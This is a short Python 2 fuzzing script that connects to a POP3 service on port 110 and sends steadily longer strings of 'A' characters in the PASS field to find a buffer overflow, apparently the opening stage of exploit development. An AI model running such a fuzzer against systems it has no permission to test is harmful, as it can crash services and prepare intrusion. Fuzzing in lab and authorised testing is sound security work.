#!/usr/bin/python2
import socket
import sys

target = sys.argv[1]

buffer=[]
counter=2500
step = 4
iter = 50
while len(buffer) <= iter:
    buffer.append("A"*counter)
    counter = counter + step

for string in buffer:
    print "Fuzzing PASS with %d bytes" % len(string)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 110))
    sock.recv(1024)
    sock.send('USER test\r\n')
    sock.recv(1024)
    sock.send('PASS ' + string + '\r\n')
    sock.send('QUIT\r\n')
    sock.close()

